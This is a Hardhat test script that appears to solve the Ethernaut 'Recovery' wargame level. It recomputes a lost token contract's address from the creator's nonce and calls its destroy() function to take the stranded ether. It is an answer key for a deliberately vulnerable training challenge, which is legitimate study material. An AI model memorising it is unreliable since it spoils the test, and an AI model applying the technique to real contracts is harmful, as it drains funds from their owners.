import { expect } from "chai";
import { getCreateAddress, Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  const challengeFactory = await ethers.getContractFactory(`Recovery`);
  const challengeAddress = await createChallenge(
    `0xAF98ab8F2e2B24F42C661ed023237f5B7acAB048`,
    ethers.parseUnits(`0.001`, `ether`),
  );
  challenge = await challengeFactory.attach(challengeAddress);
});

it("solves the challenge", async function () {
  // Predicting the Recovery contract address
  // The nonce used here refers to the deployer's transaction count:
  // - nonce = 0 for the first transaction: deploying the Recovery contract
  // - nonce = 1 for the second transaction: calling generateToken()
  const recomputedContractAddress = getCreateAddress({
    from: challenge.target as string,
    nonce: 1n,
  });
  console.log(`recomputedContractAddress`, recomputedContractAddress)

  const attackerFactory = await ethers.getContractFactory(`SimpleToken`);
  attacker = await attackerFactory.attach(recomputedContractAddress);
  tx = await attacker.destroy(await eoa.getAddress());
  await tx.wait();
});

after(async () => {
  expect(await submitLevel(challenge.target as string), "level not solved").to.be.true;
});
